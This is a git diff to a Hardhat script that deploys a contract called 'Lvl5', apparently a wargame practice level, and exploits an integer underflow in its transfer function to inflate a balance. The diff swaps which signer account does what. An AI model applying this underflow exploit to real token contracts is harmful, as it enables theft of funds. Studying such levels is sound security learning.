@@ -17,7 +17,7 @@ dotenv.config();
  */
 async function main() {
   const accounts = await ethers.getSigners();
-  const ownAddress = accounts[0].address;
+  const ownAddress = accounts[1].address;
   const contractFactory = await ethers.getContractFactory("Lvl5");
 
   console.log("Deploying contract...");
@@ -30,7 +30,7 @@ async function main() {
   console.log(`Previous wallet balance : ${previousSignerBalance} tokens.`);
 
   console.log("Exploiting contract with underflow...");
-  const exploitTx = await contract.transfer(accounts[1].address, 21);
+  const exploitTx = await contract.transfer(accounts[0].address, 21);
   await exploitTx.wait();
 
   const newSignerBalance = await contract.balanceOf(ownAddress);
